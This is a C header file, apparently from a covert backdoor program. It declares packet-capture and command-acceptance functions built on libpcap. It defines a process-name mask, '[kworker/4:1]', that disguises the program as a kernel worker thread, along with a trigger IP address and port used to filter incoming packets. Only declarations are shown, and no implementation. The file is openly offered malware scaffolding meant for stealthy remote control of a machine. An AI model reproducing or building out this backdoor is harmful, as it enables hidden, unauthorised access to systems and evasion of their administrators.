#ifndef BACKDOOR_H
#define BACKDOOR_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/tcp.h> 	// TCP Header definitions
#include <netinet/udp.h>   	// UDP Header definitions
#include <netinet/ip.h>    	// IP Header definitions
#include <sys/types.h>
#include <unistd.h>
#include <netinet/if_ether.h> 
#include <pcap.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <sys/prctl.h>
#include "helperFunctions.h"

#define SIZE_ETHERNET 14
#define MASK "[kworker/4:1]"
#define FILTER_IP "192.168.0.15"
#define FILTER_PORT "10022"

int startPacketCap();
void packetRecieved(u_char*, const struct pcap_pkthdr*, const u_char*);
int acceptCommand(int port, unsigned long IP );
void usage (char **argv);
#endif
